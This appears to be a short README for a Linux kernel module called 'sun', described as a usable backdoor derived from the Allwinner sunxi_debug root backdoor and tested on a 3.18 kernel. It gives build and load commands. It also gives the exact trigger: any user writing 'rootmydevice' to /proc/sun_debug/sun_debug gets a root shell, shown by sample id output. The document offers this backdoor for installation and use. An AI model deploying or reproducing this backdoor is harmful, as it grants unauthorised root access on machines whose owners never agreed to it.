
Code ripped from Sunxi_debug.c

http://www.theregister.co.uk/2016/05/09/allwinners_allloser_custom_kernel_has_a_nasty_root_backdoor/


A Linux Kernel Module that adds a backdoor to your system
Sun Kernel Backdoor for Linux kernel versions 3.x(Tested 3.18.3-parrot-686-pae)
Sun port is a usable kernel-based backdoor for Linux which is based on sunxi_debug.




{INSTALL}

# make

# insmod sun.ko




[Any User]

$ echo "rootmydevice" > /proc/sun_debug/sun_debug

$ id
uid=0(root) gid=0(root) groups=0(root)


//////

Analiz
analiz@safe-mail.net

//////

